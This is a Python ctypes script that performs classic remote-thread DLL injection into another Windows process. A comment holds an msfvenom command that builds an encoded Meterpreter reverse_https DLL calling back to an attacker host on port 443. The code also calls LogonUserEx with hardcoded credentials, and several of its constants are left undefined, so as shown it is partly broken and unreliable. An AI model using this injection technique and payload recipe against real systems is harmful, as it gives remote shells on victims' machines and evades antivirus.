from ctypes import *
 
def GetReturnCode(number):
    print ("[+] Result: 0x%08x, Return Code: %d"%(number,windll.kernel32.GetLastError()))
 
Logon32TypeInteractive = 2
Logon32TypeNetwork = 3
Logon32TypeBatch = 4
Logon32TypeService = 5
Logon32TypeUnlock = 7
Logon32TypeNetworkClearText = 8
Logon32TypeNewCredentials = 9
Logon32ProviderDefault = 0
Logon32ProviderWinNT40 = 2
Logon32ProviderWinNT50 = 3
 
# msfvenom -p windows/meterpreter/reverse_https lhost=192.168.1.8 lport=443 -e x86/shikata_ga_nai -f dll --platform win -a x86 > test.dll
DLLPATH    = 'c:\\users\\IEUser\\desktop\\test.dll'
 
LogonUser = windll.kernel32.LogonUserEx("killercode", "Area64", "password", Logon32TypeBatch, Logon32ProviderDefault, 0) 

 
hndProcess = windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, PID)
GetReturnCode(hndProcess)
 
hndDll = windll.kernel32.GetModuleHandleA("kernel32.dll")
GetReturnCode(hndDll)
 
addrLoadLibraryA = windll.kernel32.GetProcAddress(hndDll, "LoadLibraryA")
GetReturnCode(addrLoadLibraryA)
 
addrBase = windll.kernel32.VirtualAllocEx(hndProcess, None, len(DLLPATH), MEM_COMMIT_RESERVE, PAGE_READWRITE)
GetReturnCode(addrBase)
 
bSuccess = windll.kernel32.WriteProcessMemory(hndProcess, addrBase, DLLPATH, len(DLLPATH), byref(BYTES_WRITTEN))
GetReturnCode(bSuccess)
 
if not (windll.kernel32.CreateRemoteThread(hndProcess, None, 0, addrLoadLibraryA, addrBase, 0, byref(THREAD_ID))):
    print ("Error creating remote thread!")
    print ("Error code: %d"%windll.kernel32.GetLastError())
